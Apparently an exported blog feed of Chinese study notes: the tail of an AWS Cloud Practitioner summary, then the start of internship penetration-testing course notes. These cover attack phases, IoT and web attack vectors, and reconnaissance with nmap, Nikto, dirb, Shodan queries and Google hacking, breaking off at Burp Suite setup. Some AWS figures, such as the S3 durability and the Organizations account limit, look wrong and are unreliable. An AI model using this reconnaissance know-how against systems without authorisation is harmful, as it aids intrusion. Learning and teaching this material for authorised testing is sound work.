DMS)</h3><ul><li>將客戶資料庫轉移至AWS</li><li>在遷移期間資料庫仍然能夠保持完全運作</li><li>仰賴該資料庫的應用程式停機時間能夠降至最低</li><li>來源與目標資料庫不用式相通類型的資料庫<ul><li>Oracle -&gt;RDS for Oracle</li><li>MySQL -&gt; RDS for MySQL</li></ul></li><li>異質遷移<ul><li>來淵資料庫以及目標資料庫的 <strong>結構描述(Schema)結構</strong>、<strong>資料類型</strong>、<strong>資料庫程式碼</strong> 不同時，就需要異質遷移</li><li>需要兩步驟<ul><li><ol><li>AWS Schema Conversion Tool進行轉換</li></ol></li><li><ol start="2"><li>DMS 用來遷移資料庫</li></ol></li></ul></li></ul></li><li>開發和測試資料庫遷移<ul><li>將資料庫副本遷移到生產或測試環境，可使用DMS服務</li></ul></li><li>資料庫合併</li><li>持續資料庫複寫<ul><li>可用於災難復原</li></ul></li></ul><h3 id="AWS-DocumentDB"><a href="#AWS-DocumentDB" class="headerlink" title="AWS DocumentDB"></a>AWS DocumentDB</h3><ul><li>用於完整文件儲存</li><li>適合內容管理、目錄、使用者設定檔</li></ul><h3 id="Amazon-Neptune"><a href="#Amazon-Neptune" class="headerlink" title="Amazon Neptune"></a>Amazon Neptune</h3><ul><li>圖形式資料庫用於社群網路和推薦引擎設計</li><li>也適合詐騙偵測需求</li><li>或者供應鏈追蹤管理</li></ul><h3 id="Amazon-QLDB-Quantum-Ledger-Database"><a href="#Amazon-QLDB-Quantum-Ledger-Database" class="headerlink" title="Amazon QLDB(Quantum Ledger Database)"></a>Amazon QLDB(Quantum Ledger Database)</h3><ul><li>不可變的紀錄系統</li><li>其中所有條目都無法存稽核中刪除</li></ul><h3 id="AWS-Auto-Scaling"><a href="#AWS-Auto-Scaling" class="headerlink" title="AWS Auto Scaling"></a>AWS Auto Scaling</h3><p><img src="https://i.imgur.com/6uOa7tx.png"></p><ul><li>動態擴展</li><li>預測性擴展<br><img src="https://i.imgur.com/oPepLm4.png"></li></ul><h3 id="AWS-CloudFormation"><a href="#AWS-CloudFormation" class="headerlink" title="AWS CloudFormation"></a>AWS CloudFormation</h3><ul><li>您可以將基礎設施當作程式碼(IaC)來處理。也就是說，您可以透過撰寫程式碼行來建立環境，無需使用 AWS 管理主控台個別佈建資源。</li><li>讓您不必執行手動動作或撰寫自訂指令碼，就能頻繁建立基礎設施和應用程式。它會在管理堆疊時判斷需要執行的正確作業，並在偵測到錯誤時自動復原變更。</li></ul><h3 id="AWS-CloudTrail"><a href="#AWS-CloudTrail" class="headerlink" title="AWS CloudTrail"></a>AWS CloudTrail</h3><ul><li>全方位的API稽核工具</li><li>所有對AWS提出的API請求，都會記錄在CloudTrail中</li><li>並且記錄誰提出請求，何時發出請求，IP為只為和，回應又是甚麼等等</li><li>可以在s3 bucket當中無期限儲存這些日誌</li><li>CloudTrail 中的事件通常會在 API 呼叫後的 15 分鐘內更新</li></ul><h3 id="Amazon-CloudWatch"><a href="#Amazon-CloudWatch" class="headerlink" title="Amazon CloudWatch"></a>Amazon CloudWatch</h3><ul><li>CloudWatch可以讓客戶監控aws基礎設施以及運行在上面的應用程式</li><li>他透過追蹤以及監控<strong>指標(與資源相關的變數)</strong> 來運作<ul><li>CPU使用率</li><li>RAM使用狀態</li></ul></li><li>CloudWatch 警示(Alerm)<ul><li>當指標達到閥值，可以觸發警示</li><li>整合SNS，可以傳送警示簡訊</li></ul></li><li>CloudWatach Dashboard <ul><li>以近即時方式列出指標</li></ul></li><li>CloudWatch的優點:<ul><li>從一個集中位置存取所有指標，獲得全系統的可見性</li><li>檢視應用、基礎設施及服務</li><li>減少<strong>MTTR(解決問題的平均時間)<strong>，</strong>並改善總整體成本(TCO)</strong></li><li>深入分析應用，並幫助最佳化客戶應用</li></ul></li></ul><h3 id="AWS-Trusted-Advisor"><a href="#AWS-Trusted-Advisor" class="headerlink" title="AWS Trusted Advisor"></a>AWS Trusted Advisor</h3><ul><li>為一自動化顧問</li><li>他會根據<strong>五大支柱</strong>來評估資源<ul><li>成本最佳化</li><li>效能</li><li>安全</li><li>容錯能力</li><li>Service Limits</li></ul></li><li>會對每個支柱進行一系列檢查，並編譯分類項目供檢視</li><li>有些檢查免費</li><li>檢查項目例如: 是否啟用MFA</li></ul><h2 id="網路連結與內容交付"><a href="#網路連結與內容交付" class="headerlink" title="網路連結與內容交付"></a>網路連結與內容交付</h2><h3 id="AWS-Elastic-Load-Balancing"><a href="#AWS-Elastic-Load-Balancing" class="headerlink" title="AWS Elastic Load Balancing"></a>AWS Elastic Load Balancing</h3><ul><li>一種可在多個資源 (例如 Amazon EC2 執行個體) 之間自動分配傳入應用程式流量的 AWS 服務</li></ul><p><img src="https://i.imgur.com/sJyERPV.png"></p><ul><li>ELB會作為傳入 Auto Scaling 群組之所有 Web 流量的單一聯絡窗口。也就是說，當您為了回應傳入流量而新增或移除 Amazon EC2 執行個體時，這些請求會先路由到負載平衡器，然後分散到即將處理這些請求的多個資源中。</li></ul><h2 id="安全性、識別與合規性"><a href="#安全性、識別與合規性" class="headerlink" title="安全性、識別與合規性"></a>安全性、識別與合規性</h2><p>共同責任模型(Shared Responsibility Model)<br><img src="https://i.imgur.com/wMSpH1U.png"><br><img src="https://i.imgur.com/HOmBArE.png"></p><ul><li>客戶記得自己patch OS</li><li>aws與客戶的關係如同房屋屋主以及建商</li></ul><h3 id="AWS-Artifact"><a href="#AWS-Artifact" class="headerlink" title="AWS Artifact"></a>AWS Artifact</h3><ul><li>可以存取合規性報告，報告本身由第三方所檢驗</li><li>AWS Artifact 協議<ul><li>公司需要與 AWS 簽署關於您在整個 AWS 服務中使用特定類型資訊的協定</li><li>可以檢閱、接受和管理個別帳戶以及 AWS Organizations 中所有帳戶的協議。其中會提供不同類型的協議</li></ul></li><li>AWS Artifact 報告<ul><li>可以檢閱、接受和管理個別帳戶以及 AWS Organizations 中所有帳戶的協議。其中會提供不同類型的協議，可在 AWS Artifact 報告中存取此資訊</li><li>在 AWS Artifact 報告中存取此資訊</li></ul></li></ul><h3 id="Amazon-GuardDuty"><a href="#Amazon-GuardDuty" class="headerlink" title="Amazon GuardDuty"></a>Amazon GuardDuty</h3><ul><li>AWS威脅偵測服務</li><li>會分析帳戶產生的中繼資料連續串流，像是來自CloudTrail、VPC Flow Logs、DNS log</li><li>與aws現有服務分開執行，不會影響現有基礎設設施效能</li></ul><h3 id="AWS-Identity-and-Access-Management-IAM"><a href="#AWS-Identity-and-Access-Management-IAM" class="headerlink" title="AWS Identity and Access Management (IAM)"></a>AWS Identity and Access Management (IAM)</h3><ul><li>透過IAM可以精細的控制權限</li><li>在IAM中可以建立IAM User</li><li>IAM在剛建立時，預設不具備任何許可(不可建立EC2, S3…etc)</li><li>最低權限原則</li><li>IAM政策<ul><li>是JSON文件，描述使用者可以執行或不可執行那些API操作</li><li>可以將政策連接到使用者或是群組</li><li>Effect: <code>Allow</code> <code>Deny</code></li><li>Action: 可對資源最哪些行為</li><li>Resource: API呼叫適用於哪種AWS資源</li></ul></li><li>IAM 群組 </li><li><img src="https://i.imgur.com/u29juKI.png"></li><li>角色(Role)<ul><li>不同工作時，角色會進行切換</li><li>在AWS中也能夠建立角色</li><li>角色具有相關聯的許可，可以允許或拒絕特定動作</li><li>使用者可以暫時擔任某個角色，但沒有使用者名稱或密碼</li><li>僅能獲得暫時的許可權</li></ul></li><li><img src="https://i.imgur.com/Ds4cHxv.png"></li></ul><h3 id="Amazon-Inspector"><a href="#Amazon-Inspector" class="headerlink" title="Amazon Inspector"></a>Amazon Inspector</h3><ul><li>針對基礎設施執行自動化安全評估，以提高安全性和aws部署應用程式的合規性</li><li>可用於察看與Best Practice之間的偏差</li><li>漏洞檢查</li><li>服務分成三種:<ul><li>網路組態可達性部分</li><li>Amazon 代理程式</li><li>安全性評定服務</li></ul></li></ul><h3 id="AWS-Shield"><a href="#AWS-Shield" class="headerlink" title="AWS Shield"></a>AWS Shield</h3><ul><li>是一項可保護應用程式免於遭受 DDoS 攻擊的服務</li><li>AWS Shideld Syandard<ul><li>可免費自動保護所有 AWS 客戶</li><li>使用分析技術即時偵測並自動延緩惡意流量</li></ul></li><li>AWS Shield Advanced<ul><li>可提供詳細的攻擊診斷，和偵測與減輕複雜的 DDoS 攻擊。</li></ul></li></ul><h3 id="AWS-WAF"><a href="#AWS-WAF" class="headerlink" title="AWS WAF"></a>AWS WAF</h3><ul><li>使用Web應用程式防火牆(WAF)來篩選傳入流量</li><li>機器學系幫助識別新威脅</li><li>主動防禦</li><li>可以設定Web ACL</li></ul><h3 id="AWS-Organizations"><a href="#AWS-Organizations" class="headerlink" title="AWS Organizations"></a>AWS Organizations</h3><ul><li>管理多個aws帳戶中的中央位置</li><li>管理帳單、控制存取、合規與安全</li><li>讓所有aws帳號共享資源</li><li>功能:<ul><li>集中式管理aws帳戶</li><li>所有帳戶可合併帳單(具有折扣)</li><li>實作帳戶的階層分組(ex. BU(業務單位)、OU(組織單位))</li><li>控制每個帳戶可以存取的AWS服務以及可執行的API動作<ul><li>服務控制政策(SCP)，可用於指定成員帳戶的最大許可</li></ul></li></ul></li><li><img src="https://i.imgur.com/qwvjWXE.png"></li></ul><h3 id="Amazon-Elastic-Block-Store-Amazon-EBS"><a href="#Amazon-Elastic-Block-Store-Amazon-EBS" class="headerlink" title="Amazon Elastic Block Store (Amazon EBS)"></a>Amazon Elastic Block Store (Amazon EBS)</h3><ul><li>不希望每次使用完EC2執行個體後，資料庫就被刪掉，則可使用EBS服務</li><li>可建立虛擬硬碟，EBS磁碟區，並連接到EC2執行個體上</li><li>EBS並不直接與EC2綁定，因此可以獨立於EC2的生命週期，來持久化存放資料</li><li>需定義：大小、類型、組態</li><li>用例: 持久化儲存讓EC2寫入資料，因此備份資料很重要</li><li>EBS允許增量備份資料(又稱作<strong>快照</strong>)</li><li>定期為EBS進行快照，以備份重要資料</li><li><strong>執行個體存放區</strong>: 為EC2中所提供的臨時區塊是存放區，當EC2終止時，存放區中的資料也會消失</li><li><img src="https://i.imgur.com/8AVNGzr.png"></li><li><img src="https://i.imgur.com/1kkfeOT.png"></li><li><img src="https://i.imgur.com/QNVkgdB.png"></li><li>EBS 快照: 第一次備份會複製磁碟區中所有資料，後續就只會儲最近一次快照以來變更的資料區塊，屬於<strong>增量備份</strong></li></ul><h3 id="Amazon-S3"><a href="#Amazon-S3" class="headerlink" title="Amazon S3"></a>Amazon S3</h3><ul><li>資料存放以<strong>物件</strong>形式存放，但並非存放於檔案目錄，而是存放在<strong>儲存眝體(bucket)</strong></li><li>上傳物件大小上限為： <strong>5TB</strong></li><li>可以建立**物件版本(Object Versioning)**，防止意外刪除</li><li>可以建立多個buckt，來放在不同資料類別或是資料層中</li><li>可建立許可(Permission)來限制誰可以存取物件</li><li><code>Amazon S3 Standard</code>: 具有 99.99999999% 耐久性，代表該檔案在一年後保持完整的機率<ul><li><code>資料存放的方式</code>: 資料至少會存放在三個設施中，在不同地點都有副本</li><li><code>靜態網站託管</code>: 託管html檔或其他靜態檔案資產到s3</li></ul></li><li><code>Amazon S3 Standard-Infrequent(IA)</code>: 用於存取頻率低，但需要時需要快速存取<ul><li>適合存放備份、災害復原、長期存放資料</li><li><code>Amazon S3 Glacier</code>: 可用於稽核資料長期存放</li><li>可建立文件庫，並使用<strong>文件庫鎖定政策</strong>，來滿足當地法規對於稽核資料存放年限的要求</li><li>可在文件庫鎖定政策中使用控制措施 - <strong>單寫多讀(WORM)</strong> 模型，來防止未來的寫入行為</li></ul></li><li>生命週期政策: 可在不同層之間自動移動資料<ul><li>例如: 需要將一個物件在S3 Standard中保留90天，接下來移動到s3-IA中保留30天，120天候移動到s3 glacier，這種時候就能夠建立生命週期政策來自動化這些行為</li></ul></li><li><code>Amazon S3 單區域-IA</code> <ul><li>資料存放在單一區域中</li><li>價格比S3 Standard-IA還要低</li><li>若想要節省儲存成本則選擇此儲存類別</li></ul></li><li><code>Amazon S3 Intelligent-Tiering</code><ul><li>適合存取模式未知或持續變更的資料</li><li>每個物件需要支付小額每月監控和自動化費用</li></ul></li><li>物件:</li><li><img src="https://i.imgur.com/fNAXd5H.png"></li></ul><h3 id="Amazon-S3-Glacier"><a href="#Amazon-S3-Glacier" class="headerlink" title="Amazon S3 Glacier"></a>Amazon S3 Glacier</h3><ul><li>專會資料封存所設計</li><li>能在幾分鐘或幾小時內擷取資料</li><li>可用於儲存已封存的客戶資料或是舊相片影片檔案</li></ul><h3 id="Amazon-S3-Glacier-Deep-Archive"><a href="#Amazon-S3-Glacier-Deep-Archive" class="headerlink" title="Amazon S3 Glacier Deep Archive"></a>Amazon S3 Glacier Deep Archive</h3><ul><li>適合封存的最低成本物件儲存類別</li><li>能在12小時內擷取物件</li></ul><h3 id="Amazon-Elastic-File-System-Amazon-EFS"><a href="#Amazon-Elastic-File-System-Amazon-EFS" class="headerlink" title="Amazon Elastic File System (Amazon EFS)"></a>Amazon Elastic File System (Amazon EFS)</h3><ul><li>允許多個執行個體同時存去EFS當中的資料</li><li>可是需求擴展或縮減</li></ul><h2 id="EBS-與-S3的比較"><a href="#EBS-與-S3的比較" class="headerlink" title="EBS 與 S3的比較"></a>EBS 與 S3的比較</h2><table><thead><tr><th></th><th>EBS</th><th>S3</th></tr></thead><tbody><tr><td>儲存容量</td><td>16TB</td><td>無限制，個別物件最高為5TB</td></tr><tr><td>特色</td><td>在EC2終止時繼續存活</td><td>單寫多讀(WORM)</td></tr><tr><td>儲存型態</td><td>固態</td><td></td></tr><tr><td>耐久度</td><td></td><td>99.99999999%</td></tr><tr><td>使用案例</td><td>80GB影片檔案正在編輯，可啟用物件版本紀錄，而不用每次都重新上傳全新的物件，採用區塊式儲存</td><td>靜態網站託管、區域分散式儲存、資料備份、無伺服器</td></tr><tr><td>總結案例</td><td>複雜寫入讀取更動等功能</td><td>完整物件、偶而更動等資料</td></tr></tbody></table><h2 id="EBS-與-EFS的差別"><a href="#EBS-與-EFS的差別" class="headerlink" title="EBS 與 EFS的差別"></a>EBS 與 EFS的差別</h2><ul><li>EBS磁碟區會連接到EC2，而EBS是 <strong>可用區域層級資源</strong>，若要將EC2連接到EBS上，兩者必須位於相同可用區域當中</li><li>EBS是硬碟，可存放檔案資料、資料庫或應用程式，硬碟區塞滿後，並不會資動擴展</li><li>EFS並不是一個空白的硬碟，而是真正的Linux檔案系統</li><li>EFS是一種<strong>區域性資源</strong>，區域內的任何EC2都能夠寫入EFS檔案系統</li><li>EFS寫入更多資料時，它會自動擴展</li></ul><h2 id="RDS-和-DynamoDB的差別"><a href="#RDS-和-DynamoDB的差別" class="headerlink" title="RDS 和 DynamoDB的差別"></a>RDS 和 DynamoDB的差別</h2><table><thead><tr><th>RDS</th><th>DynamoDB</th></tr></thead><tbody><tr><td>自動高可用性、可提供復原</td><td>鍵值對，不須結構性描述</td></tr><tr><td>客戶擁有資料所有權</td><td>巨大傳輸容量</td></tr><tr><td>客戶擁有描述所有權(Schema)</td><td>PB級大小擴展潛力</td></tr><tr><td>客戶對網路有控制權</td><td>精密API存取權限</td></tr></tbody></table><p>使用案例:</p><ul><li>銷售供應鏈管理系統，若要進行商業分析，則需要複雜的關聯式連結，這時就適合使用RDS</li><li>上述案例外的其他案例，DynamoDB幾乎都可用，大多案例不需要複雜的關聯式連結，像是員工聯絡人表格，用單一表格就能夠解決了，RDS的複雜功能以及管理費用，DynamoDB則能夠消除所有管理費用，並且可建立快速高效能的資料庫</li></ul><h2 id="定價"><a href="#定價" class="headerlink" title="定價"></a>定價</h2><ul><li>免費方案:<ul><li>永遠免費<ul><li>AWS Lamda每個月允許一百萬次免費呼叫</li></ul></li><li>12個月免費<ul><li>S3 可免費使用12個月高達5GB的儲存</li></ul></li><li>某些服務可以短期試用<ul><li>Lightsaul 提供一個月的試用期，使用期間最高可達750小時</li></ul></li></ul></li><li>Pricing Model<ul><li>Pay-as-you-go 按照使用量付費，無須長期合約</li><li>預留容量</li><li>以量計算的折扣: 某些服務提供分級定價，每單位成本隨著用量增加而降低<ul><li>Ex. S3儲存空間越多，每GB支付費用就越少</li></ul></li></ul></li><li>定價計算機</li><li>帳單儀表板<ul><li>存取 Cost Explorer 並建立預算</li><li>將您本月份至今的餘額與上個月進行比較，並根據目前的用量獲得下個月的預測</li><li>檢視各項服務免費方案用量</li><li>發布 AWS 成本和用量報告</li></ul></li><li>合併帳單<ul><li>為AWS Organization的功能之一</li><li>可以將個別aws帳戶的帳單合併，ˇ但還是可以分項查看帳單</li><li>可以將AWS資源的使用量彙總到組織層級</li><li>個別帳戶帳單即使金額低，若合併組織中的帳單有機會獲得批量折扣價</li><li>簡化計費流程</li><li>免費功能</li><li>一個組織允許的預設帳戶數目上限為 4 個</li></ul></li><li>預算服務<ul><li>可以建立預算金額閥值，並發出警示提醒到電子郵件中 </li><li>預算中的資訊每天更新三次</li></ul></li><li>Cost Explorer<ul><li>以控制台為基礎的服務，可透過視覺化來查看跟分析在aws上的花費</li><li>會顯示在哪個服務上化最多錢</li><li>並提供12個月的歷史資料，可追蹤成本隨時間的變化</li><li>提供強大的報表，也可自定義報表內容</li></ul></li></ul><h2 id="Support-服務"><a href="#Support-服務" class="headerlink" title="Support 服務"></a>Support 服務</h2><ul><li>基本支援(免費)<ul><li>24小時客服服務</li><li>文件、白皮書、論壇</li><li>AWS Trusted Advisor</li><li>AWS Personal Health Dashboard</li></ul></li><li>開發人員方案<ul><li>基本支援</li><li>電子郵件取得客戶支援(12小時回覆)</li></ul></li><li>商業支援<ul><li>基本與開發人員支援</li><li>AWS Trusted Advisor提供完整最佳實踐檢查</li><li>直接與雲端支援工程師電話聯絡(4小時的回應SLA)</li><li>若生產系統受損，針對損壞的生產系統提供1小時的SLA</li><li>基礎設施事件管理(EX.大型活動、全球發布會…etc)</li></ul></li><li>企業支援(適合執行關鍵任務工作負載的公司)<ul><li>基本、開發人員和商業支援(外加針對商業關鍵工作負載的15分鐘SLA)</li><li>適用於TAM(Technical Account Manager)的技術帳戶管理員<ul><li>TAM會與客戶一同根據Well-Architected 架構來檢視企業架構</li></ul></li></ul></li></ul><p><img src="https://i.imgur.com/r20KK1m.png"></p><h2 id="AWS-Marketplace"><a href="#AWS-Marketplace" class="headerlink" title="AWS Marketplace"></a>AWS Marketplace</h2><ul><li>是包含獨立軟體開發廠商數千種軟體產品的數位型錄，可簡化、部署和管理在AWS架構中執行第三方軟體的步驟</li><li>您可以使用 AWS Marketplace 尋找、測試和購買能在 AWS 上執行的軟體</li><li>當客戶在使用Marketplace中的第三方應用時，無需建構安裝維護這些程式所需的基礎設施</li><li>一鍵式部署</li><li>一樣按使用量付費</li><li>許多廠商提供免費試用</li><li>以企業為主的功能<ul><li>可自訂條款和定價，可管理自訂授權合約</li><li>私人市集，可建立符合當地法規或安全要求的預先核准軟體決方案目錄</li><li>整合採購系統</li><li>aws成本管理工具</li></ul></li></ul><h2 id="AWS-Cloud-Adoption-Framework-AWS-CAF"><a href="#AWS-Cloud-Adoption-Framework-AWS-CAF" class="headerlink" title="AWS Cloud Adoption Framework(AWS CAF)"></a>AWS Cloud Adoption Framework(AWS CAF)</h2><ul><li>向客戶公司提供建議，藉由指引協助客戶管理遷移至雲端的過程</li><li>AWS CAF觀點(不同領域的人帶來不同觀點，並且會有不同的遷移策略)<ul><li>商業: 側重商業能力</li><li>人員: 側重商業能力</li><li>治理: 側重商業能力</li><li>平台: 技術能力</li><li>安全: 技術能力</li><li>營運: 技術能力</li></ul></li></ul><h2 id="遷移策略"><a href="#遷移策略" class="headerlink" title="遷移策略"></a>遷移策略</h2><ul><li>6個R策略<ul><li>重新託管(Rehosting)<ul><li>選取應用程式幾乎照搬到AWS</li><li>僅透過重新託管能夠節省高達30%的總成本</li></ul></li><li>平台重建&#x2F;微調搬遷<ul><li>會進行一些雲端最佳化，但不需要調整核心程式碼</li></ul></li><li>汰換(Retired)<ul><li>某些企業的it產品組合中包含不再使用的應用程式</li></ul></li><li>保留(Retain)<ul><li>某些應用程式需要被取代，但時機未到，可能還會再跑好幾個月</li><li>這些應用就可遷移到aws</li></ul></li><li>重新購買(Repurchase)<ul><li>放棄舊有授權軟體，轉用雲端原生產品等</li><li>前期成本高，但潛在益處大</li></ul></li><li>重構(Refactor)<ul><li>重寫程式碼</li><li>某些功能可能是以前無法再內部部署的</li></ul></li></ul></li></ul><h2 id="AWS-Snow-Family"><a href="#AWS-Snow-Family" class="headerlink" title="AWS Snow Family"></a>AWS Snow Family</h2><p>皆防竄改，皆由客戶的256bit金鑰來對資料進行加密<br><img src="https://i.imgur.com/2lh2GeS.png"></p><h3 id="AWS-Snowcone"><a href="#AWS-Snowcone" class="headerlink" title="AWS Snowcone"></a>AWS Snowcone</h3><ul><li>最多可容納8TB的資料並包含<strong>邊緣運算(包含EC2和AWS IOT Greengrass)</strong></li><li>可以透過aws主控台下單裝置</li><li>客戶可以安裝裝置並複製資料再運回aws</li><li>aws再將資料複製到aws帳戶中的s3 bucket</li><li>8TB,4G RAM, 2CPU</li></ul><h3 id="AWS-Snowball-Edge"><a href="#AWS-Snowball-Edge" class="headerlink" title="AWS Snowball Edge"></a>AWS Snowball Edge</h3><ul><li>兩種選項<ul><li>Compute Optimized:<ul><li>適合大規模資料遷移以及週期性傳輸工程</li><li>80TB</li></ul></li><li>Storage Optimized: <ul><li>適合機器學習、全動態影片分析以及本機運算堆疊</li><li>80TB</li></ul></li></ul></li><li>可以放入現有伺服器機架</li><li>並可使用ec2或iot Greengras做運算</li><li>使用案例<ul><li>Iot裝置串流</li><li>影片轉碼</li><li>工業訊號處理</li></ul></li></ul><h3 id="AWS-Snowmobile"><a href="#AWS-Snowmobile" class="headerlink" title="AWS Snowmobile"></a>AWS Snowmobile</h3><ul><li>裝置在45英尺高的巨大容器中</li><li>由卡車運送</li><li>容納100PB(100000TB)的資料</li><li>裝置防竄改、防水、滅火，具有溫度控制功能</li><li>安全團隊視訊監控護宋團隊</li></ul><h2 id="可用區域-Avaiable-Zone"><a href="#可用區域-Avaiable-Zone" class="headerlink" title="可用區域(Avaiable Zone)"></a>可用區域(Avaiable Zone)</h2><p><img src="https://i.imgur.com/l3j0kFf.png"><br>AZ是區域內的一個資料中心或一組資料中心。可用區域各自坐落於彼此的數十英里外。這個距離夠近，足以在可用區域之間維持低延遲 (內容從請求到接收之間的時間)。不過，如果區域中的一部分發生災難，它們的距離也夠遠，足以降低多個可用區域受到影響的機會。</p><h2 id="節點"><a href="#節點" class="headerlink" title="節點"></a>節點</h2><p>是透過 CloudFront 來將您內容的快取副本存放在更靠近客戶位置的站點，以便加快交付<br><img src="https://i.imgur.com/LEbdL9B.png"></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Certificate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>實習筆記-滲透測試課程</title>
      <link href="/posts/8ec27a58.html"/>
      <url>/posts/8ec27a58.html</url>
      
        <content type="html"><![CDATA[<p>課程內容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- Web基本知識</span><br><span class="line">- 主動/被動資訊收集</span><br><span class="line">- 常見的web漏洞</span><br><span class="line">- 靶機</span><br><span class="line">- DVWA（Damn Vulnerable Web Application）</span><br><span class="line">- RF(無線射頻)滲透測試(物聯網)</span><br><span class="line">- 基本的通訊協定</span><br><span class="line">- 軟體定義無線電SDR</span><br></pre></td></tr></table></figure><h2 id="PT-滲透測試-vs-RT-紅隊演練"><a href="#PT-滲透測試-vs-RT-紅隊演練" class="headerlink" title="PT(滲透測試) vs RT(紅隊演練)"></a>PT(滲透測試) vs RT(紅隊演練)</h2><ul><li>PT:範圍較小，且無法針對社交工程 ex.某個網頁</li><li>RT:範圍較大 ex.整個公司</li></ul><p>黑箱:最貼近真實情境<br>白箱:盡可能提供相關資訊給受測者<br>灰箱:黑白箱混和，會提供自我宣告表以後再給受測者測試</p><h2 id="滲透測試流程"><a href="#滲透測試流程" class="headerlink" title="滲透測試流程:"></a>滲透測試流程:</h2><ol><li>資料蒐集</li><li>透洞掃描</li><li>漏洞利用<br> 白帽:<ol start="4"><li>漏洞回報<br> 黑帽:</li><li>提權限</li><li>持續性存取</li><li>防禦逃脫(逃脫會叫的那種警報器)</li><li>資料攜出(把DB分批攜出)<br><img src="https://i.imgur.com/10o9kG8.jpg"></li></ol></li></ol><h2 id="IOT的攻擊向量-Attack-Vector"><a href="#IOT的攻擊向量-Attack-Vector" class="headerlink" title="IOT的攻擊向量(Attack Vector)"></a>IOT的攻擊向量(Attack Vector)</h2><p><img src="https://i.imgur.com/CFMACnJ.jpg"></p><ul><li>Hardware:Physical Interface<br>  給開發人員使用，出廠後並未關掉，若能訪問到該接口通常都能直接取得root，通常底層皆為明文傳輸<ul><li>設備外殼並未提供保護機制</li><li>底層使用明文傳輸</li><li>毛刺攻擊(Glitching):用微小的電壓，去擾動硬體設備</li><li>測信到攻擊(Side Channel Attack):加密晶片，可以去量測他的電壓、音頻…，用這些東西去分析加密的方式、Key等等</li></ul></li><li>韌體(Firmware):Hardcode, Enc key, exploit<ul><li>軟體&#x2F;韌體未進行加密</li><li>有敏感資料</li></ul></li><li>Software:Andriod app</li><li>Radio:Cellular, WiFi, 蜂窩網路<ul><li>無線通訊未加密可進行嗅探(Sniffer)</li><li>干擾攻擊(Jamming)</li><li>重放攻擊</li><li>模糊攻擊(fuzz):需先擬向工程才能fuzz</li><li>通訊協定:最麻煩，需要原廠處理</li></ul></li><li>Cloud:<ul><li>API攻擊</li><li>注入攻擊</li><li>身分認證&#x2F;授權機制</li><li>邏輯漏洞</li><li>web漏洞</li></ul></li></ul><h2 id="網頁的攻擊向量"><a href="#網頁的攻擊向量" class="headerlink" title="網頁的攻擊向量"></a>網頁的攻擊向量</h2><p><img src="https://i.imgur.com/zfkdfrI.jpg"><br>Web1.0</p><ul><li>布告欄的概念</li><li>只有靜態網頁</li></ul><p>Web2.0</p><ul><li>可讀寫，多功能的動態頁面</li><li>應用程序</li><li>DB(個資)</li><li>API</li><li>不同用戶會有不同的頁面</li></ul><p>Web3.0</p><ul><li>去中心化(資料分散放)</li></ul><p>HTTP</p><ul><li>由Request&#x2F;Response組成</li><li>由於HTTP屬於無狀態，因此需依賴cookie機制來記錄user資訊與time</li><li>狀態碼<br>  <img src="https://i.imgur.com/Bk1hb59.png"></li></ul><h2 id="攻擊標的"><a href="#攻擊標的" class="headerlink" title="攻擊標的"></a>攻擊標的</h2><ol><li>使用者身分</li></ol><ul><li>認證</li><li>權限劃分</li><li>Session<br>ex.HTTP封包格式皆相同，該基站</li></ul><ol start="2"><li>輸入輸出:</li></ol><ul><li>Sql Injection</li><li>Command Injection</li><li>需經過正規化處理</li><li>開發者需要設定確定的字元<br>ex. 數字欄位填中文或英文</li></ul><ol start="3"><li>程式邏輯</li></ol><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具:"></a>常用工具:</h2><p>Information Gathering:分為主動、被動</p><ul><li><p>主動資訊蒐集<br>  <img src="https://i.imgur.com/M9nPHnv.png"></p><ul><li>nmap主動蒐集目標資訊:掃描目標主機port<br>  <img src="https://i.imgur.com/GTvO6kr.jpg"></li><li>Nikto開源的網站弱點掃描工具:自帶在Kali內</li><li>Dirb暴力枚舉網頁下的目錄與檔案  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirb url</span><br><span class="line">#去看網頁內存不存在敏感資料</span><br><span class="line">#有可能可以掃出使用者的路徑</span><br><span class="line">#如果有開阿帕契作為中繼站，能掃出來</span><br></pre></td></tr></table></figure></li></ul></li><li><p>被動資訊蒐集</p><ul><li><p>用被動資料(IP、姓名、生日..)來描述目標</p></li><li><p>不與目標直接接觸，避免留下痕跡</p></li><li><p>SHODAN</p><ul><li>可以掃描世界上所有的物聯網設備</li><li>主機</li><li>開啟端口</li><li>是否有已知漏洞</li><li>可使用下方關鍵字搜尋:<ul><li>hostname：搜尋指定的主機或域名，例如 hostname:”google”</li><li>port：搜尋指定的埠或服務，例如 port:”21”</li><li>country：搜尋指定的國家，例如 country:”CN”</li><li>city：搜尋指定的城市，例如 city:”Hefei”</li><li>org：搜尋指定的組織或公司，例如 org:”google”</li><li>isp：搜尋指定的ISP供應商，例如 isp:”China Telecom”</li><li>product：搜尋指定的作業系統&#x2F;軟體&#x2F;平臺，例如 product:”Apache httpd”</li><li>version：搜尋指定的軟體版本，例如 version:”1.6.2”</li><li>geo：搜尋指定的地理位置，引數為經緯度，例如 geo:”31.8639, 117.2808”</li><li>before&#x2F;after：搜尋指定收錄時間前後的資料，格式為dd-mm-yy，例如 before:”11-11-15”</li><li>net：搜尋指定的IP地址或子網，例如net:”210.45.240.0&#x2F;24”</li><li>參考:<ul><li><a href="https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf">https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf</a></li><li><a href="https://www.itread01.com/content/1546699324.html">https://www.itread01.com/content/1546699324.html</a></li></ul></li></ul></li></ul></li><li><p>Google Hacking</p><ul><li>用Google Search針對目標進行情報搜尋</li><li>用”site:”去搜尋</li></ul></li></ul></li><li><p>過濾封包</p><ul><li>Burp Suite<br>  使用方法:<br>  使用Kali 開啟Burp Site<br>  <img src="https://i.imgur.com/8gomHwp.png"><br>  開啟proxy 表示之後所有流量都會經過burp<br>  &lt;之前的版本需要簽憑證&gt;<br>  